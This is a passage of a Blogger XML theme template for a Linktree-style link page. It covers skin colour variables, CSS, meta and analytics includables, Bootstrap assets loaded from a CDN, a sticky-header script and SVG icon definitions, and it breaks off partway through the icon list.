### COPY - PASTE
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html>
<html b:css='false' b:defaultwidgetversion='2' b:js='true' b:layoutsVersion='3' expr:dir='data:blog.languageDirection' expr:lang='data:blog.locale' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
  <b:include name='root'/>
  <head>
    <title><data:view.title.escaped/></title>
    <b:include name='it:head'/>
    <b:if cond='!data:view.isLayoutMode'>
      <b:skin><![CDATA[
        /*!
         * Name      : Blinks - Linktree Blogger template
         * Theme URL : https://link.nixyproject.cfd
         * Source    : https://github.com/rulnoveid/blinks
         * Version   : 3.0.0
         * Author    : RulnoveID (https://github.com/rulnoveid)
         * License   : GPL (https://github.com/rulnoveid/blinks/blob/main/LICENSE)
         * Copyright : 2023 inputekno. All right reserved
         *//*

        Default
        =====================
        <Variable name="d.favicon" description="HD favicon" type="string" value=""/>
        <Variable name="d.ogImage" description="og:imagen" type="string" value=""/>

        General
        =====================
        <Variable name="g.scheme" description="Scheme by default" type="string" value="system"/>
		<Variable name="g.animation" description="Enable Animation" type="string" value="true"/>
		<Variable name="g.stickyProfile" description="Enable Sticky" type="string" value="false"/>
		<Variable name="g.hiddeFooter" description="Hidden Footer" type="string" value="false"/>

        <Group description="Accents">
          <Variable name="accent.primary" description="Action color" type="color" default="#6f42c1" value="#42c16e"/>
		  <Variable name="accent.link" description="Alternate Color" type="color" default="#6f42c1" value="#42c16e"/>
        </Group>

        <Group description="Social Color">
          <Variable name="c.primary" description="Primary color" type="color" default="#fff" value="#ffffff"/>
          <Variable name="c.facebook" description="Facebook Color" type="color" default="#3b5998" value="#3b5998"/>
          <Variable name="c.twitter" description="Twitter Color" type="color" default="#1D9BF0" value="#1D9BF0"/>
          <Variable name="c.instagram" description="Instagram Color" type="color" default="#c13584" value="#c13584"/>
		  <Variable name="c.tiktok" description="Tiktok Color" type="color" default="#25F4EE" value="#25F4EE"/>
          <Variable name="c.whatsapp" description="Whatsapp Color" type="color" default="#25D366" value="#25D366"/>
          <Variable name="c.telegram" description="Telegram Color" type="color" default="#27A7E7" value="#27A7E7"/>
          <Variable name="c.linkedin" description="Linkedin Color" type="color" default="#0A66C2" value="#0A66C2"/>
          <Variable name="c.pinterest" description="Pinterest Color" type="color" default="#c8232c" value="#c8232c"/>
          <Variable name="c.spotify" description="Spotify Color" type="color" default="#1db954" value="#1db954"/>
          <Variable name="c.discord" description="Discord Color" type="color" default="#5865F2" value="#5865F2"/>
          <Variable name="c.github" description="Github Color" type="color" default="#211f1f" value="#211f1f"/>
          <Variable name="c.youtube" description="Youtube Color" type="color" default="#FF0000" value="#FF0000"/>
          <Variable name="c.dribbble" description="Dribbble Color" type="color" default="#E94C88" value="#E94C88"/>
          <Variable name="c.medium" description="Medium Color" type="color" default="#211f1f" value="#211f1f"/>
          <Variable name="c.paypal" description="Paypal Color" type="color" default="#2997D8" value="#2997D8"/>
          <Variable name="c.twitch" description="Twitch Color" type="color" default="#6441A4" value="#6441A4"/>
          <Variable name="c.signal" description="Signal Color" type="color" default="#237f52" value="#237f52"/>
          <Variable name="c.reddit" description="Reddit Color" type="color" default="#FF4500" value="#FF4500"/>
          <Variable name="c.google.play" description="Google Playstore Color" type="color" default="#3089AC" value="#3089AC"/>
          <Variable name="c.envelope" description="Envelope Color" type="color" default="#BB001B" value="#BB001B"/>
          <Variable name="c.tumblr" description="Tumblr Color" type="color" default="#34526f" value="#34526f"/>
          <Variable name="c.vk" description="VK Color" type="color" default="#4C75A3" value="#4C75A3"/>
          <Variable name="c.threads" description="Threads Color" type="color" default="#211f1f" value="#211f1f"/>
		  <Variable name="c.shopee" description="Shopee Color" type="color" default="#EE4D2D" value="#EE4D2D"/>
		  <Variable name="c.tokopedia" description="Tokopedia Color" type="color" default="#42B549" value="#42B549"/>
		  <Variable name="c.blibli" description="Blibli Color" type="color" default="#0072FF" value="#0072FF"/>
        </Group>

*//*! skin.css */
:root {
  --primary: $(accent.primary);
  --color-link: $(accent.link);
  --body-bg: var(--bs-body-bg);
  --color-text: var(--bs-body-color);
  --font-size: 1rem;
  --font-primary: 'Noto Sans', sans-serif;
  --font-secondary: Poppins;
  --font-logo: 'Bootstrap-icons';
  --svg-size : 22px;
  --svg-stroke : 1.5;
  --color-svg: currentColor;
  --duration: .3s;
  --social-primary: $(c.primary);
  --social-facebook: $(c.facebook);
  --social-twitter: $(c.twitter);
  --social-instagram: $(c.instagram);
  --social-whatsapp: $(c.whatsapp);
  --social-tiktok: $(c.tiktok);
  --social-telegram: $(c.telegram);
  --social-linkedin: $(c.linkedin);
  --social-pinterest: $(c.pinterest);
  --social-spotify: $(c.spotify);
  --social-discord: $(c.discord);
  --social-github: $(c.github);
  --social-youtube: $(c.youtube);
  --social-dribbble: $(c.dribbble);
  --social-medium: $(c.medium);
  --social-paypal: $(c.paypal);
  --social-twitch: $(c.twitch);
  --social-signal: $(c.signal);
  --social-reddit: $(c.reddit);
  --social-google-play: $(c.google.play);
  --social-envelope: $(c.envelope);
  --social-tumblr: $(c.tumblr);
  --social-vk: $(c.vk);
  --social-threads: $(c.threads);
  --social-shopee: $(c.shopee);
  --social-tokopedia: $(c.tokopedia);
  --social-blibli: $(c.blibli);
}

[data-bs-theme=dark] {
  --color-svg: var(--bs-emphasis-color);
}
      ]]></b:skin>
      <b:else/>
      <b:template-skin><![CDATA[
body#layout{position:relative;width:auto;max-width:100%;background-color:#f9f9f9;padding:95px 5px 0;margin:0}body#layout:before{content:'Linktree Blogger - v3.0.0';position:absolute;top:0;left:5px;right:5px;height:95px;font-family:Roboto,sans-serif;font-size:23px;color:#0F1618;line-height:95px;text-align:center}
body#layout:after{content:'Design by InpuTekno.com';display:block;font-family:Roboto,sans-serif;font-size:14px;color:#555;line-height:1;text-align:center;visibility:visible;padding:20px 0}
body#layout #header{background-color:#edf4ff!important;overflow:hidden!important;border-color:#cdd4ef} body#layout div.section{display:block;background-color:#f1f1f1!important;margin:0 5px 10px!important;padding:16px 16px 18px!important;border-color:#e5e5e5}
body#layout .section h4{font-size:14px;color:#0F1618;text-transform:uppercase;margin:0}
body#layout .section h4:after{text-transform:initial;color:#656565;font-weight:400}
body#layout .add_widget a{color:#3c97ef!important}
body#layout .widget-wrap3{overflow:hidden}
body#layout .layout-widget-description{display:none;font-size:11px;line-height:1.2em}
body#layout .section .widget-content .editlink.icon{background-image:none;left:0;top:0;width:100%;height:100%}
body#layout .section .locked-widget .widget-content{background-image:url("https://www.gstatic.com/images/icons/material/system_gm/1x/lock_grey600_20dp.png");background-repeat:no-repeat;background-position:center right 10px}body#layout .section .widget-content .layout-title{margin:0 30px 0 0;color:#999}
body#layout .section .widget-content .layout-title::before{color:#262626;font-weight:500}
body#layout #Image1 .layout-title::before{content:"Profile:"}
body#layout #TextList000 .layout-title::before{content:"Menu:"}
body#layout #LinkList101 .layout-title::before{content:"Linktree:"}
body#layout #LinkList104 .layout-title::before{content:"Alternatif:"}
body#layout #Text1 .layout-title::before{content:"Title and Desc:"}
body#layout .section h4> h4:after{font-size:12px}
body#layout #header> h4:after{content:' - Profile Header and Menu'}
body#layout #it-linktree-main> h4:after{content:' - Default Linktree'}
body#layout #linktree-two> h4:after{content:' - Alternatif Linktree two'}
	]]></b:template-skin>
    </b:if>
    <b:comment>CORE (v3.0.0)!</b:comment>
    <b:defaultmarkups>
      <b:defaultmarkup type='All'>
      </b:defaultmarkup>
      <b:defaultmarkup type='AdSense,Blog'>
      </b:defaultmarkup>
      <b:defaultmarkup type='Blog,PopularPosts,FeaturedPost'>
      </b:defaultmarkup>
      <b:defaultmarkup type='PopularPosts,FeaturedPost'>
      </b:defaultmarkup>
      <b:defaultmarkup type='Blog'>
      </b:defaultmarkup>
      <b:defaultmarkup type='BlogArchive'>
      </b:defaultmarkup>
      <b:defaultmarkup type='BlogSearch'>
      </b:defaultmarkup>
      <b:defaultmarkup type='Header'>
      </b:defaultmarkup>
      <b:defaultmarkup type='Label'>
      </b:defaultmarkup>
      <b:defaultmarkup type='PageList'>
      </b:defaultmarkup>
      <b:defaultmarkup type='Profile'>
      </b:defaultmarkup>
      <b:defaultmarkup type='Common'>
        <b:includable id='@:analytics'>
          <b:if cond='data:blog.analyticsAccountNumber'>
            <script async='async' expr:src='params(&quot;https://www.googletagmanager.com/gtag/js&quot;,{id: data:blog.analyticsAccountNumber})'/>
            <script>
              window.dataLayer = window.dataLayer || [];
              function gtag(){dataLayer.push(arguments);}
              gtag(&#39;js&#39;, new Date());
              gtag(&#39;config&#39;,&#39;<data:blog.analyticsAccountNumber/>&#39;);
            </script>
          </b:if>
        </b:includable>
        <b:includable id='@:meta'>
          <meta expr:charset='data:blog.encoding'/>
          <meta content='width=device-width,initial-scale=1' name='viewport'/>
          <meta content='IE=edge' http-equiv='X-UA-Compatible'/>

          <b:if cond='data:favicon'>
            <b:loop values='(data:favSizes ?: [32,96,180,192])' var='size'>
              <link expr:href='resizeImage(data:favicon, data:size, &quot;1:1&quot;)' expr:sizes='data:size + &quot;x&quot; + data:size' rel='icon' type='image/png'/>
            </b:loop>
            <b:else/>
            <link expr:href='data:blog.blogspotFaviconUrl' rel='icon' type='image/x-icon'/>
          </b:if>

          <meta expr:content='data:view.description.escaped' name='description'/>
          <b:with value='data:https ? data:view.url.canonical.https : data:view.url.canonical' var='canonical'>
            <link expr:href='data:canonical' rel='canonical'/>
            <meta expr:content='data:canonical' property='og:url'/>
            <meta expr:content='data:canonical' name='twitter:url'/>
          </b:with>
          <meta expr:content='data:view.isHomepage ? &quot;website&quot; : &quot;article&quot;' property='og:type'/>
          <meta expr:content='data:view.title.escaped' property='og:title'/>
          <meta expr:content='data:view.description.escaped' property='og:description'/>
          <b:if cond='data:view.featuredImage or data:ogImage'>
            <b:with value='resizeImage((data:view.featuredImage ?: (data:ogImage != &quot;&quot; ? data:ogImage : data:widgets.Blog.first.posts.first.featuredImage)), 1200, &quot;1200:630&quot;)' var='image'>
              <meta expr:content='data:image' property='og:image'/>
              <meta expr:content='data:image' name='twitter:image'/>
              <b:if cond='data:image.isResizable'>
                <meta expr:content='data:image.width' property='og:image:width'/>
                <meta expr:content='data:image.height' property='og:image:height'/>
              </b:if>
            </b:with>
          </b:if>
          <meta expr:content='data:cardType ?: &quot;summary_large_image&quot;' name='twitter:card'/>
          <meta expr:content='data:view.description.escaped' name='twitter:description'/>
        </b:includable>
        <b:includable id='@:kind'>
          <b:class cond='data:view.isHomepage' name='is-home'/>
          <b:class cond='data:view.isError' name='is-error'/>
          <b:class cond='data:view.isPreview' name='is-preview'/>
        </b:includable>
        <b:includable id='root'>
          <b:attr name='xmlns' value=''/>
          <b:attr name='xmlns:b' value=''/>
          <b:attr name='xmlns:data' value=''/>
          <b:attr name='xmlns:expr' value=''/>
        </b:includable>
        <b:includable id='it:head'>
          <b:include data='{ ogImage: data:skin.vars.d_ogImage, favicon: data:skin.vars.d_favicon }' name='@:meta'/>
          <meta expr:content='[&quot;light&quot;,&quot;dark&quot;] contains data:skin.vars.g_scheme ? data:skin.vars.g_scheme : &quot;light dark&quot;' name='color-scheme'/>
          <link crossorigin='anonymous' href='https://cdn.jsdelivr.net/' rel='preconnect'/>
          <link href='https://cdn.jsdelivr.net/' rel='dns-prefetch'/>
          <b:include data='{ get: &quot;css&quot; }' name='it:assets'/>
          <b:include data='{ get: &quot;main&quot; }' name='it:assets'/>
          <b:if cond='data:skin.vars.g_hiddeFooter'>
            <b:include data='{ get: &quot;inlineCSS&quot; }' name='it:assets'/>
          </b:if>
          <b:include name='@:analytics'/>
        </b:includable>
        <b:includable id='it:assets'>
          <b:switch var='data:get'>
            <b:case value='main'/>
            <style>/*<![CDATA[*/
                /*!@inputekno/linktree@1.0.0 | Licensed under MIT (https://github.com/rulnoveid/blinks/blob/master/LICENSE) */
@media screen and (min-width:768px){::-webkit-scrollbar{-webkit-appearance:none;width:4px;height:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:rgba(0,0,0,.15);border-radius:10px}::-webkit-scrollbar-thumb:hover{background:rgba(0,0,0,.35)}::-webkit-scrollbar-thumb:active{background:rgba(0,0,0,.35)}}
*,::after,::before{box-sizing:border-box} html{line-height:1.5;-webkit-text-size-adjust:100%;-webkit-font-smoothing:antialiased} body,html{height:100%}*{margin:0}
body{font-family:var(--font-secondary);font-size:var(--font-size);min-height:100%;overflow-x:hidden;background:var(--body-bg);background-size:cover;word-break:break-word;-webkit-hyphens:auto;hyphens:auto} a {color:inherit;text-decoration:none} ol, ul {list-style:none;padding:0;margin:0} .section {position:relative} .section+* > .widget:not(:last-child){margin-bottom:1rem} .sector-wrap {text-align:center;margin-left:auto;margin-right:auto;margin-bottom:2rem}
.dropdown-menu {font-size:.875rem;padding:.5rem;--bs-dropdown-link-active-bg:var(--primary)} .dropdown-menu .dropdown-item {border-radius:var(--bs-border-radius)} .dropdown-toggle::after {display:none} .sticky {position:fixed;top:-20px;left:0;right:0;z-index:1020} #header> *:not(:last-child) {padding:16px 20px} .hiddens {visibility:hidden;position:absolute;top:0} .cr-footer{flex-direction:column;align-items:center;justify-content:center;text-align:center}.cr-footer a:hover{color:var(--color-link)}

/* main css */ .hasImage{width:100%;height:100%;background:rgba(0,0,0,.05);background-size:100%;background-position:center;background-repeat:no-repeat;display:block}.i{width:var(--svg-size,18px);height:var(--svg-size,18px);stroke:var(--color-svg);stroke-width:var(--svg-stroke,2);stroke-linecap:round;stroke-linejoin:round;fill:none}.bi{font-size:18px}.main.wrapper,footer.wrapper{position:relative;margin-top:2rem}.section+*{max-width:680px;width:100%;margin:auto}.section+*{margin-top:2rem}.it-template:not(.is-grid) .layout-toggle>*:nth-child(2),.is-grid .layout-toggle>*:nth-child(1){display:none}.sticky{transform:translateY(40px);transition:transform .5s;background:rgba(90,90,90,0.12);backdrop-filter:blur(10px);border-radius:1rem;margin:0 10px}.sticky .top-toggle{right:50px;transform:translate(50%,50%)}.top-toggle{align-items:center;position:absolute;top:0;right:0;margin:0}.top-toggle>*{padding:.5rem;position:relative;font-size:12px}.top-toggle .is-dark .dropdown-menu{--svg-size:18px}@media screen and (min-width:768px){.top-toggle{right:90px}.sticky{max-width:calc(788px);margin-right:auto;margin-left:auto;width:100%}.sector-wrap{width:calc(100% - 10%)}}

/* Profile card */ .author-profile{margin-top:5rem}.author-profile,.sticky-profile{display:flex;align-items:center;gap:.7rem;flex-direction:column;text-align:center}.author-avatar,.author-avatars{width:100px;height:100px;flex:0 0 100px;border:1px solid var(--bs-border-color);border-radius:var(--bs-border-radius-pill);overflow:hidden}.author-desc{--svg-size:14px;--color-svg:#1d9aef}.author-name,.author-names{font-size:1.25rem;font-weight:700;display:flex;align-items:center;justify-content:center;gap:.5rem}.sticky-profile{flex-direction:row;text-align:inherit}.author-avatars{width:45px;height:45px;flex:0 0 45px}.author-names{font-size:1rem;justify-content:start;margin-bottom:.3rem}

/* Linktree css */ .main-linktree{display:grid;grid-row-gap:1rem}.main-linktree .dropdown-menu.show{display:grid;grid-row-gap:1rem;margin-top:1rem;font-size:1rem;position:relative;padding:0;top:0;border:none}.it-template:not(.is-grid) .main-linktree{grid-row-gap:1rem}.is-grid .main-linktree:not(.is-linktwo){grid-template-columns:repeat(auto-fit,minmax(min(100%,var(--cols-min,16rem)),1fr));grid-gap:1rem;--cols-min:14rem}.social-link{position:relative;color:var(--bs-body-color);text-align:center;text-transform:capitalize;display:flex;align-items:center;padding:14px;border:1px solid var(--bs-border-color);border-radius:var(--bs-border-radius);transition:all var(--duration) ease;--svg-size:20px}.social-link svg{flex-shrink:0}.social-title{flex-grow:1}.social-link:hover{background:var(--primary);color:var(--bs-light);transform:scale(1.02);transition:all var(--duration) ease;border-color:transparent;--color-svg:var(--body-bg);--color-svg:#fff}.main-linktree .social-link:hover svg{--color-svg:#fff}

/* Link alternatif */ .is-linktwo{flex-wrap:wrap;align-items:center;justify-content:center;gap:.5rem}.is-linktwo >*{gap:.5rem;padding:10px;background:var(--primary);color:var(--bs-light)}.is-linktwo >*:hover{color:var(--color-link);background:none;border-color:var(--bs-border-color);--color-svg:currentColor}

.main-linktree li {opacity:0;animation-name:fadeInUp;animation-duration:1s;animation-fill-mode:both;-webkit-animation-name: fadeInUp;-webkit-animation-duration:1s;-webkit-animation-fill-mode:both}
.main-linktree li:nth-child(1) {animation-delay: 0.0s; }
.main-linktree li:nth-child(2) {animation-delay: 0.5s; }
.main-linktree li:nth-child(3) {animation-delay: 1.0s; }
.main-linktree li:nth-child(4) {animation-delay: 1.5s; }
.main-linktree li:nth-child(5) {animation-delay: 2.0s; }
.main-linktree li:nth-child(6) {animation-delay: 2.5s; }
@keyframes fadeInUp {from {transform: translate3d(0,40px,0)} to {transform: translate3d(0,0,0);opacity: 1}}
@-webkit-keyframes fadeInUp {from {transform: translate3d(0,40px,0)} to {transform: translate3d(0,0,0);opacity: 1}}

/* Color Social */
[data-icon*="whatsapp"] {--color-svg:var(--social-whatsapp)}
[data-icon*="facebook"] {--color-svg:var(--social-facebook)}
[data-icon*="instagram"] {--color-svg:var(--social-instagram)}
[data-icon*="twitter"] {--color-svg:var(--social-twitter)}
[data-icon*="tiktok"] {--color-svg:var(--social-tiktok)}
[data-icon*="telegram"] {--color-svg:var(--social-telegram)}
[data-icon*="linkedin"] {--color-svg:var(--social-linkedin)}
[data-icon*="pinterest"] {--color-svg:var(--social-pinterest)}
[data-icon*="spotify"] {--color-svg:var(--social-spotify)}
[data-icon*="discord"] {--color-svg:var(--social-discord)}
[data-icon*="github"] {--color-svg:var(--social-github)}
[data-icon*="youtube"] {--color-svg:var(--social-youtube)}
[data-icon*="dribbble"] {--color-svg:var(--social-dribbble)}
[data-icon*="medium"] {--color-svg:var(--social-medium)}
[data-icon*="paypal"] {--color-svg:var(--social-paypal)}
[data-icon*="twitch"] {--color-svg:var(--social-twitch)}
[data-icon*="signal"] {--color-svg:var(--social-signal)}
[data-icon*="reddit"] {--color-svg:var(--social-reddit)}
[data-icon*="google"] {--color-svg:var(--social-google-play)}
[data-icon*="email"] {--color-svg:var(--social-envelope)}
[data-icon*="tumblr"] {--color-svg:var(--social-tumblr)}
[data-icon*="vk"] {--color-svg:var(--social-vk)}
[data-icon*="threads"] {--color-svg:var(--social-threads)}
[data-icon*="shopee"] {--color-svg:var(--social-shopee)}
[data-icon*="tokopedia"] {--color-svg: var(--social-tokopedia)}
[data-icon*="blibli"] {--color-svg: var(--social-blibli)}

/* Color hover */
[data-icon*="whatsapp"]:hover {background:var(--social-whatsapp)}
[data-icon*="facebook"]:hover {background:var(--social-facebook)}
[data-icon*="instagram"]:hover {background:linear-gradient(45deg,#833ab4,var(--social-instagram),#e1306c,#fd1d1d)}
[data-icon*="twitter"]:hover {background:var(--social-twitter)}
[data-icon*="tiktok"]:hover {background:linear-gradient(30deg,var(--social-tiktok),#000000,#FE2C55)}
[data-icon*="telegram"]:hover {background:var(--social-telegram)}
[data-icon*="linkedin"]:hover {background:var(--social-linkedin)}
[data-icon*="pinterest"]:hover {background:var(--social-pinterest)}
[data-icon*="spotify"]:hover {background:var(--social-spotify)}
[data-icon*="discord"]:hover {background:var(--social-discord)}
[data-icon*="github"]:hover {background:var(--social-github)}
[data-icon*="youtube"]:hover {background:var(--social-youtube)}
[data-icon*="dribbble"]:hover {background:var(--social-dribbble)}
[data-icon*="medium"]:hover {background:var(--social-medium)}
[data-icon*="paypal"]:hover {background:var(--social-paypal)}
[data-icon*="twitch"]:hover {background:var(--social-twitch)}
[data-icon*="reddit"]:hover {background:var(--social-reddit)}
[data-icon*="google"]:hover {background:var(--social-google-play)}
[data-icon*="email"]:hover {background:var(--social-envelope)}
[data-icon*="tumblr"]:hover {background:var(--social-tumblr)}
[data-icon*="vk"]:hover {background:var(--social-vk)}
[data-icon*="threads"]:hover {background:var(--social-threads)}
[data-icon*="shopee"]:hover {background:var(--social-shopee)}
[data-icon*="tokopedia"]:hover {background: var(--social-tokopedia)}
[data-icon*="blibli"]:hover {background: var(--social-blibli)}
/*]]>*/
            </style>
            <b:case value='css'/>
            <link crossorigin='anonymous' href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css' integrity='sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN' rel='stylesheet'/>
            <link href='https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css' rel='stylesheet'/>
            
            <b:case value='inlineCSS'/>
            <style>.creator { visibility:hidden;height:0 }</style>
            
            <b:case value='js'/>
            <script crossorigin='anonymous' integrity='sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r' src='https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js'/>
    <script crossorigin='anonymous' integrity='sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+' src='https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js'/>
            
            <b:case value='inlineJs'/>
            <b:if cond='data:skin.vars.g_stickyProfile'>
              <script>/*<![CDATA[*//* Custom - Sticky Profile | v1.7.0 - https://www.inputekno.com */ function headScroll(){const e=window.pageYOffset||document.documentElement.scrollTop,o=document.getElementById("header"),d=o.offsetHeight,t=document.querySelector(".author-profile");profiles=document.querySelector(".sticky-profile"),e>200?(document.body.style.paddingTop=d+"px",document.body.style.marginTop=d+"px",o.classList.add("sticky"),profiles.classList.remove("hiddens"),t.style.display="none"):(document.body.style.paddingTop="0",document.body.style.marginTop="0",o.classList.remove("sticky"),profiles.classList.add("hiddens"),t.style.display="")}window.addEventListener("scroll",headScroll);/*]]>*/</script>
            </b:if>
            
          </b:switch>
        </b:includable>
        <b:includable id='i:svg'>
          <svg expr:class='&quot;i i-&quot; + data:icon' viewBox='0 0 24 24'>
            <b:class cond='data:class' expr:name='data:class'/>
            <b:attr cond='data:root' expr:value='data:root' name='class'/>
            <b:attr cond='data:viewbox' expr:value='data:viewbox' name='viewBox'/>
            <b:attr expr:value='data:fill' name='fill'/>
            <b:attr expr:value='data:width' name='width'/>
            <b:attr expr:value='data:height' name='height'/>
            <b:switch var='data:icon'>
              <b:case value='badge-check'/><path d='m8.5 12.5 2 2 5-5m4.3 5.7a1 1 0 0 0 0-6.4 1 1 0 0 0-4.6-4.6 1 1 0 0 0-6.4 0 1 1 0 0 0-4.6 4.6 1 1 0 0 0 0 6.4 1 1 0 0 0 4.6 4.6 1 1 0 0 0 6.4 0 1 1 0 0 0 4.6-4.6Z'/>
              <b:case value='coffee'/><path d='M6 2v3m4-3v3m4-3v3m4 4v9a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4V9h17a1 1 0 0 1 0 8h-1'/>
              <b:case value='columns'/><rect height='18' rx='2' width='18' x='3' y='3'/><path d='M12 3v18'/>
              <b:case value='desktop'/><rect height='15' rx='3' width='22' x='1' y='3'/><path d='M8 21h8M1 13h22'/>
              <b:case value='devices'/><path d='M1 19h12m0-3H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v3'/><rect height='10' rx='2' width='6' x='17' y='12'/>
              <b:case value='sun'/><circle cx='12' cy='12' r='5'/><path d='M12 1v2m0 18v2M4.2 4.2l1.4 1.4m12.8 12.8 1.4 1.4M1 12h2m18 0h2M4.2 19.8l1.4-1.4M18.4 5.6l1.4-1.4'/>
              <b:case value='moon'/><path d='M21 14a9 9 0 1 1-9-11 7 7 0 0 0 9 11z'/>
              <b:case value='rows'/><rect height='18' rx='2' width='18' x='3' y='3'/><path d='M3 12h18'/>
              <b:case value='chevron-down'/><path d='m4 8 8 8 8-8'/>
              <b:case value='blogger'/><path d='M8 15h8M8 9h4m7 0q-1 0-1-1a6 6 0 0 0-6-6H8a6 6 0 0 0-6 6v8a6 6 0 0 0 6 6h8a6 6 0 0 0 6-6v-5a2 2 0 0 0-2-2Z'/>
              <b:case value='download-cloud'/><path d='M18 17a5 5 0 1 0 0-10A1 1 0 1 0 5 9a1 1 0 0 0 0 8h1m3 3 3 3 3-3m-3 3V11'/>
              <b:case value='download'/><path d='m7 10 5 5 5-5m-5 5V3m10 12v4a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2v-4'/>
              <b:case value='link'/><path d='M9 13a5 5 0 0 0 8 1l4-4a1 1 0 0 0-7-7l-2 2m3 6a5 5 0 0 0-8-1l-4 4a1 1 0 0 0 7 7l2-2'/>
              <b:case value='linkedin'/><circle cx='4' cy='4' r='2'/><path d='M2 9h4v12H2Zm20 12h-4v-7a2 2 0 0 0-4 0v7h-4v-7a6 6 0 0 1 12 0Z'/>
              <b:case value='facebook-alt'/><circle cx='12' cy='12' r='11'/><path d='M12 23V9.5A2.5 2.5 0 0 1 15 7m-5 6h4.5'/>
              <b:case value='facebook'/><path d='M17 14h-3v8h-4v-8H7v-4h3V7a5 5 0 0 1 5-5h3v4h-3q-1 0-1 1v3h4Z'/>
              <b:case value='instagram'/><circle cx='12' cy='12' r='4'/><rect height='20' rx='5' width='20' x='2' y='2'/><path d='M17.5 6.5h0'/>
              <b:case value='twitter'/><path d='M12 7.5a4.5 4.5 0 0 1 8-3Q22 4 23 3q0 2-2 4A13 13 0 0 1 1 19q5 0 7-2-8-4-5-13 4 5 9 5Z'/>
              <b:case value='twitch'/><path d='M8 22v-4H3V6l4-4h14v12l-4 4h-5Zm3-15v4m5-4v4'/>
              <b:case value='pinterest'/><circle cx='12' cy='12' r='11'/><path d='m8 22 3-11a1 1 0 0 0 5 5.5A6 6 0 1 0 6 12'/>
              <b:case value='github'/><path d='M9 22v-3q0-2 1-3A7 6.5 0 0 1 5 5Q4 3 5 1q3 0 4 2 3.5-1 7 0 1-2 4-2 1 2 0 4a7 6.5 0 0 1-5 11q1 1 1 3v3m-7-3c-4 1-4-2-7-3'/>
              <b:case value='gitlab'/><path d='M1 14 5 2l3 8h8l3-8 4 12-11 8Z'/>
              <b:case value='gohugo'/><path d='m12 1 9.5 5.5v11L12 23l-9.5-5.5v-11ZM9 8v8m0-4h6m0-4v8'/>
              <b:case value='youtube'/><rect height='18' rx='5' width='22' x='1' y='3'/><path d='m9 16 7-4-7-4v8Z'/>
              <b:case value='telegram'/><path d='M12.5 16 9 19.5 7 13l-5.5-2 21-8-4 18-7.5-7 4-3'/>
              <b:case value='tiktok'/><path d='M22 6v5q-4 0-6-2v7a7 7 0 1 1-5-6.7m0 6.7a2 2 0 1 0-2 2 2 2 0 0 0 2-2V1h5q2 5 6 5'/>
              <b:case value='tumblr'/><path d='M18 17.5V22h-4a5 5 0 0 1-5-5v-7H7V6.5q3.3-.9 3.5-4.5H14v4h4v4h-4v6.5q0 1 1 1Z'/>
              <b:case value='spotify'/><circle cx='12' cy='12' r='11'/><path d='M6 8q7-2 12 1M7 12q5.5-1.5 10 1m-9 3q4.5-1.5 8 1'/>
              <b:case value='discord'/><path d='M9 3q-2.5.5-5 2-3 5-3 12 2 2.5 6 4 1-1.5 1.5-3.5M7 17q5 2 10 0m-1.5.5q.5 2 1.5 3.5 4-1.5 6-4 0-7-3-12-2.5-1.5-5-2l-1 2q-2-.5-4 0L9 3'/><circle cx='8' cy='12' r='1'/><circle cx='16' cy='12' r='1'/>
              <b:case value='dribbble'/><circle cx='12' cy='12' r='10'/><path d='M8.5 2.7a38 38 0 0 1 8.1 18.1m2.6-15.7a18 10 0 0 1-17.1 5.8m3.2 8.5A14 15 0 0 1 21.9 13'/>
              <b:case value='medium'/><path d='M2.846 6.887a.928.928 0 0 0-.303-.784l-2.24-2.7V3h6.958l5.378 11.795L17.367 3H24v.403L22.084 5.24a.561.561 0 0 0-.213.538v13.498a.56.56 0 0 0 .213.537l1.871 1.837v.403h-9.412v-.403l1.939-1.882c.19-.19.19-.246.19-.537V8.321l-5.389 13.688h-.728L4.28 8.321v9.174c-.052.385.076.774.347 1.052l2.521 3.058v.404H0v-.404l2.521-3.058c.27-.279.39-.67.325-1.052V6.887z'/>
              <b:case value='paypal'/><path d='m6 22 4-16h7a1 1 0 0 1 0 11h-4.7L11 22Zm1-4H2L6 2h7a1 1 0 0 1 0 11H8.3'/>
              <b:case value='whatsapp'/><circle cx='9' cy='9' r='1'/><circle cx='15' cy='15' r='1'/><path d='M8 9a7 7 0 0 0 7 7m-9 5.2A11 11 0 1 0 2.8 18L2 22Z'/>
              <b:case value='threads'/><path d='M20 8C18 0 6 0 4 8s1.5 14 8 14 10-7.6 4-10-9 2-7 4 7 1 7-4-5-6-7-4'/>
              <b:case value='reddit'/><circle cx='20' cy='5' r='2'/><path d='M5 10.5a14 14 0 0 1 14 0 2.4 2.4 0 1 1 2.5 4 9.6 6.6 0 1 1-19 0 2.4 2.4 0 1 1 2.5-4Zm7-1.9 1.5-6.1 4.6 1.7M10 18q2 1 4 0m-5-4h0m6 0h0'/>
              <b:case value='app-store'/><circle cx='12' cy='12' r='11'/><path d='M5.5 14h7m.8-8.5L8.6 14M7 17l.3-.5m6.2-5.9L17 17m-1.6-3h3.1m-7.8-8.5L12 7.8'/>
              <b:case value='google-drive'/><path d='m1.5 15 7-12h7l7 12-3.5 6H5ZM5 21l7-12m-3.5 6h14m-6.9 0L8.5 3'/>
              <b:case value='google-play'/><path d='M6.8 2.2a2.5 2.5 0 0 0-3.8 2v15.6a2.5 2.5 0 0 0 3.8 2L21 13.7a2 2 0 0 0 0-3.4ZM3.2 3.5l12.8 13m-12.8 4L16 7.5'/>
